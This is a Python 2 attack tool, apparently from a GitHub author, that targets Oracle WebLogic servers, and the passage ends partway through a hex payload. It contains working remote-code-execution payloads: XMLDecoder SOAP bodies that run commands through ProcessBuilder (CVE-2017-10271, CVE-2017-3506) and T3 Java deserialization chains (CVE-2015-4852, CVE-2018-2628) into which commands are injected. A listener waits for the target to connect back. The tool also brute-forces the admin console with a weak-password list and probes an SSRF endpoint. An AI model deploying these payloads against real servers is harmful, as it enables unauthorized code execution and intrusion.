# !/usr/bin/env python  
# -*- coding: utf-8 -*-  
# Date       : 2018年8月29日 15:30:08
# Author     : https://github.com/aloswoya
# Function   : weblogic
# Vision     :1.0
import requests,datetime,socket,argparse,re,struct,threading,ssl
from time import sleep
from binascii import b2a_hex
class WebLogic:
    def __init__(self,url,port,sip,sport,os,waittime,check,shell):
        self.waittime = waittime
        self.shell = shell
        if 'http' not in url:
            self.ip = url
            print 'HOST:',self.ip
            if port == 443:
                url = 'https://' + url
            else:
                url = 'http://' + url
        else:
             self.ip = url.split('/')[-1]
             print 'HOST:',self.ip
        self.url = url.strip('/')
        print "URL:",self.url
        self.port = int(port)
        self.check = check
        if os == 'liunx':
            self.target = 'liunx' 
        else:
            self.target = 'win' 
        self.trackip = sip
        self.trackport = sport
        self.listening ='' 
        self.sss =False  
        self.t3 = True 
        #测试用
        #self.cve2628playload ='aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e310000044bfffffffff6546e0f00000000000000000000000000000078'  
        #弹计算器
        #self.cve2628playload ='aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005374002679736f73657269616c2e7061796c6f6164732e436f6d6d6f6e73436f6c6c656374696f6e7335740018436f6d6d6f6e73436f6c6c656374696f6e73352e6a6176617400096765744f626a6563747371007e000b0000003571007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a78737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b657971007e00014c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00017870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00055b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e003200000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00327371007e002b7571007e002f00000002707571007e002f00000000740006696e766f6b657571007e003200000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e002f7371007e002b757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e00320000000171007e00377371007e0027737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878'
        
        self.c2893playload ='aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000001282820000000000000010000011baced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e310000044bffffffffa2c6e09e0000000000000000000000000000007878'
        print '[*] Test Weblogic Vul For:',self.url+':'+str(self.port)
    def time(self):
        return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    def xmlDecoder(self):
        print '-'*45
        print '[*]',self.time()
        print '[*] Strat Test Vul CVE-2017-10271'
        headers = {
            "Content-Type":"text/xml;charset=UTF-8",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        xml = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <object id="url" class="java.net.URL">
          <string>http://{url}:{port}</string>
        </object>
        <object idref="url">
          <void id="stream" method = "openStream" />
        </object>
      </java>
    </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
''' 
        xml2 = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>{cmd_base}</string>
            </void>
            <void index="1">
              <string>{cmd_opt}</string>
            </void>
            <void index="2">
              <string>{cmd_payload}</string>
            </void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''
        if self.check:
            try:
                req = requests.post(self.url+":"+str(self.port)+"/wls-wsat/CoordinatorPortType", headers=headers, data=xml.format(url =self.ip, port = self.port ),timeout=5,verify=False,allow_redirects=False)
            except requests.exceptions.ConnectionError,e:
                print '[-] ConnectionError,Check Your Input'
                return False
        else:
            try:
                req = requests.post(self.url+":"+str(self.port)+"/wls-wsat/CoordinatorPortType", headers=headers, data=xml2.format(cmd_base =self.cmd_base() , cmd_opt = self.cmd_opt(),cmd_payload=self.cmds() ),timeout=5,verify=False,allow_redirects=False)
            except requests.exceptions.ConnectionError,e:
                print '[-] ConnectionError,Check Your Input'
                return False
        if req.status_code == 500 :
            print('[+] Weblogic Has Vul CVE-2017-10271')
        else:
            print '[-] Weblogic Not Has Vul CVE-2017-10271'
    def c3506(self):
        print '-'*45
        print '[*]',self.time()
        print '[*] Strat Test Vul CVE-2017-3506'
        headers = {
            "Content-Type":"text/xml;charset=UTF-8",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        xml = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                     <soapenv:Header>
                         <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                            <java version="1.8.0_131" class="java.beans.XMLDecoder">
                                <object class="java.lang.ProcessBuilder">
                                    <array class="java.lang.String" length="3">
                                         <object index="0">
                                            <string>{cmd_base}</string>
                                        </object>
                                         <object index="1">
                                             <string>{cmd_opt}</string>
                                         </object>
                                         <object index="2">
                                            <string>{cmd_payload}</string>
                                         </object>
                                    </array>
                                <object method="start"/></object>
                            </java>
                        </work:WorkContext>
                     </soapenv:Header>
                    <soapenv:Body/>
                </soapenv:Envelope>'''        
        if self.check:
            try:
                req = requests.post(self.url+":"+str(self.port)+"/wls-wsat/CoordinatorPortType", headers=headers, data=xml.format(cmd_base =self.cmd_base() , cmd_opt = self.cmd_opt(),cmd_payload=''),timeout=10,verify=False,allow_redirects=False)
            except requests.exceptions.ConnectionError,e:
                print '[-] ConnectionError,Check Your Input'
                return False 
            except requests.exceptions.ReadTimeout,e:
                print 'requests.exceptions.ReadTimeout'
                return False      
        else:
            try:
                req = requests.post(self.url+":"+str(self.port)+"/wls-wsat/CoordinatorPortType", headers=headers, data=xml.format(cmd_base =self.cmd_base() , cmd_opt = self.cmd_opt(),cmd_payload=self.cmds() ),timeout=10,verify=False,allow_redirects=False)
            except requests.exceptions.ConnectionError,e:
                print '[-] ConnectionError,Check Your Input'
                return False
            except requests.exceptions.ReadTimeout,e:
                print 'requests.exceptions.ReadTimeout'
                return False
        if req.status_code == 500 :
            print '[+] Weblogic Has Vul CVE-2017-3506'
        else:
            print '[-] Weblogic Not Has Vul CVE-2017-3506'
    
    def weakPasswd(self):
        print '-'*45
        print self.time()
        print '[*] Strat Test Vul Weak Password'
        ret=''
        users = ['weblogic'] 
        pwds =['weblogic','app123456','admin','Oracle@123','password']
        count = len(users) * len(pwds)
        print "[*] Will Blast Count:",count
        for user in users:
            for pwd in pwds:
                data = {
                    'j_username':user,
                    'j_password':pwd,
                    'j_character_encoding':'UTF-8'
                }
                print '[*]',user,pwd
                sleep(0.5)
                try:
                    req = requests.post(self.url+':'+str(self.port)+'/console/j_security_check', data=data, allow_redirects=False, verify=False,timeout=10)
                except requests.exceptions.ConnectionError,e:
                    print '[-] ConnectionError,Check Your Input'
                    return False
                except requests.exceptions.ReadTimeout,e:
                    print '[-] Read timed out'
                if req.status_code == 302 and 'console' in req.text and 'login' not in req.text:
                    ret = '[+] WebLogic Username Is:  '+user+'   Password is:  '+pwd
                    break
            else:
                continue
            break
        if ret !='':
            print ret
        else:
            print '[-] Weblogic Not Has Weak Password'
    def ssrf(self):
        print '-'*45
        print self.time()
        print '[*] Strat Test Vul',
        print 'CVE-2014-4210(ssrf)'
        payload = self.url+":"+str(self.port)+"/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
        try:
            req = requests.get(payload,allow_redirects=False, timeout=10, verify=False)
        except requests.exceptions.ConnectionError,e:
            print '[-] ConnectionError,Check Your Input'
            return False
        if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
            print("[+] WebLogic Has Vul ssrf")
        else:
            print("[-] Weblogic Not Has Vul ssrf")
    def slis(self):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
                s.bind((self.trackip, self.trackport))
                self.sss = True
                s.listen(5)
                while True:
                    print '[*] Listening For %s:%s' %(self.trackip,self.trackport)
                    s, addr = s.accept()
                    addr = '[*] Accept New Connection From %s:%s...' % addr
                    if addr>0:
                        self.listening = addr
                        s.close()
                        break
                break
            except Exception as e:
                s.close()
                print e
                print '\n[*] Bind Port Failed,Make Sure Your Is Correct: IP:%s,Port:%s' %(self.trackip, self.trackport)
                break
    def C4852(self):
        print '-'*45
        print self.time()
        print '[*] Strat Test Vul CVE-2015-4852'
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_addr = (self.ip, self.port)
        print '[*] Connecting to %s port %s' % server_addr
        try:
            sock.connect(server_addr)
        except Exception, e:
            print '[-] ConnectionError,Check Your Input',"Error:",e
            return False   
        print '[*] Sending Headers'
        sock.sendall('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
        if len(sock.recv(1024))>0:
            print '[*] Handshake Successful'
        else:
            print '[*] T3 Handshake Failed '
            print "[-] WebLogic Cannot Make Use Of Vul CVE-2015-4852"
            return False
        chunk1='00000b4d016501ffffffffffffffff000000710000ea6000000018432ec6a2a63985b5af7d63e64383f42a6d92c9e9af0f9472027973720078720178720278700000000c00000002000000000000000000000001007070707070700000000c00000002000000000000000000000001007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000'
        cmd = '{0} {1} {2}'.format(self.cmd_base(),self.cmd_opt(),self.cmds())
        chunk2 ="aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005374002679736f73657269616c2e7061796c6f6164732e436f6d6d6f6e73436f6c6c656374696f6e7335740018436f6d6d6f6e73436f6c6c656374696f6e73352e6a6176617400096765744f626a6563747371007e000b0000003571007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a78737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b657971007e00014c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00017870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00055b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e003200000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00327371007e002b7571007e002f00000002707571007e002f00000000740006696e766f6b657571007e003200000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e002f7371007e002b757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174{0}{1}740004657865637571007e00320000000171007e00377371007e0027737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878".format('{:04x}'.format(len(cmd)),b2a_hex(cmd))
        chunk3  = 'fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200074900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774621000000000000000000093132372e302e312e31000b75732d6c2d627265656e73a53caff10000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff0078fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d018140128134bf427600093132372e302e312e31a53caff1000000000078'
        len_hex = hex(len(chunk1.decode('hex')) + len(chunk2.decode('hex')) + len(chunk3.decode('hex'))).replace('0x', '0')
        chunk1 = '0000'+len_hex+'016501ffffffffffffffff000000710000ea6000000018432ec6a2a63985b5af7d63e64383f42a6d92c9e9af0f9472027973720078720178720278700000000c00000002000000000000000000000001007070707070700000000c00000002000000000000000000000001007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000'
        payload = chunk1.decode('hex') + chunk2.decode('hex') + chunk3.decode('hex')
        payload = "{0}{1}".format(struct.pack('!i', len(payload)), payload[4:])
        self.sss = False
        t = threading.Thread(target=self.slis)
        t.setDaemon(True)
        t.start()
        st = 0
        while True:
            pass
            if self.sss:
                print '\n[*] Sendding Payload...'
                sleep(2)
                sock.send(payload)
                break
            else:
                sleep(self.waittime)
                st =st+1
                if st > 5:
                    print '[*] Listening Port Failed'
                    print "[-] Check Vul CVE-2015-4852 Error_Code:332"
                    return
        while t.isAlive():
            sleep(self.waittime)
            st = st +1
            if st%12==0:
                print '[*] Waiting For Server Connect.' 
            if st>60:
                print '[*] TimeOut.'
                break
        if self.listening !='':
            print self.listening
            print "[+] WebLogic Has Vul CVE-2015-4852"
        else:
            print "[-] WebLogic Not Has Vul CVE-2015-4852"      
    def cve2628(self):
        print '-'*45
        print self.time()
        print '[*] Strat Test Vul CVE-2018-2628'
        VER_SIG=['\\$Proxy[0-9]+']
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        server_addr = (self.ip, self.port)
        try:
            sock.connect(server_addr)
        except Exception, e:
            print '[-] ConnectionError,Check Your Input',"Error:",e
            return False   
        sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
        sleep(self.waittime)
        if len(sock.recv(1024))>0:
            print '[*] Handshake Successful'
        else:
            print '[*] T3 Handshake Failed '
            print "[-] WebLogic Cannot Make Use Of Vul CVE-2018-2628"
            return False
        if self.check:
            pass
        else:
            print '[*] Start JRMPListener'
        data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
        data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(self.port))
        data3 = '1a7727000d3234322e323134'
        data4 = '2e312e32353461863d1d0000000078'
        for d in [data1, data2, data3, data4]:
            sock.send(d.decode('hex'))
        srdata = ''
        tims = 0
        try:
            while True:
                srdata += sock.recv(2048)
                sleep(0.01)
                tims =tims+0.1
                if tims>30:
                    print '[*] TimeOut.'
                    break
        except socket.timeout,e:
            if len(srdata)>0:
                print '[*] Send Request Payload Successful,Recv Length:%d' % (len(srdata))
            else:
                print '[*] TimeOut:Waited For data More Than 30 seconds'
                print '[-] CVE-2018-2628 May Can\'t be Used Of WebLogic'
                return
        except Exception as e:
            pass
        if len(srdata)>0:
            pass
        else:
            print '[*] WebLogic Has Not Return Any Data'
            print '[-] CVE-2018-2628 May Can\'t Be Used Of WebLogic'
            return
        payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
        cmd = '{0} {1} {2}'.format(self.cmd_base(),self.cmd_opt(),self.cmds())
        payload+='aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005374002679736f73657269616c2e7061796c6f6164732e436f6d6d6f6e73436f6c6c656374696f6e7335740018436f6d6d6f6e73436f6c6c656374696f6e73352e6a6176617400096765744f626a6563747371007e000b0000003571007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a78737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b657971007e00014c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6